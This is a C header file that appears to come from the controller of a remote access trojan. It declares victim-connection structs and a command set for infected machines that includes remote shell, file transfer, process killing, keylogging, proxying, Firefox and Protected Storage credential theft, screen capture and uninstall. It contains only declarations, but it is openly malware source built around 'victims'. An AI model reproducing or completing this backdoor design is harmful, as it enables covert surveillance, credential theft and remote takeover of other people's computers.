typedef struct
{
	HWND	hWnd;
	int		port;
	int		maxvicts;
} NETSTRUCT;

/*typedef struct
{
	HWND	hWnd;
	int		id;
	SOCKET	sock;
	char	ip[16];
} CNETSTRUCT;
*/

typedef struct
{
	HWND	hWnd;
	SOCKET	sock;
	char	ip[16];
	int		maxvicts;
} VNETSTRUCT;

typedef enum
{
	STATUS,
	NEW,
	DEAD,
	ECHO,
	DIE,
	UNINSTALL,
	MSGBOX,
	SHELL,
	FILES,
	FILEDEL,
	FILEIN,
	FILEOUT,
	FILEMKDIR,
	FILEDELDIR,
	INFO,
	PROCESS_REFRESH,
	PROCESS_RUN,
	PROCESS_KILL,
	REBOOT,
	SHUTDOWN,
	KEYLOGGER,
	KEYLOGGERACTION,
	PROXY,
	PROXYACTION,
	PINGUPDATE,
	FIREFOX,
	PSTORE,
	CAPTURESCREEN,
	CAPTURESEND,
	CAPTUREACTION
} MSGTYPE;


UINT NET_Thread(LPVOID param);
UINT NET_PingThread(LPVOID param);
void NET_CloseConnections();
void NET_ClearVictim(HWND hWnd, int i);
int NET_Send(int i, MSGTYPE ord, char *extra);

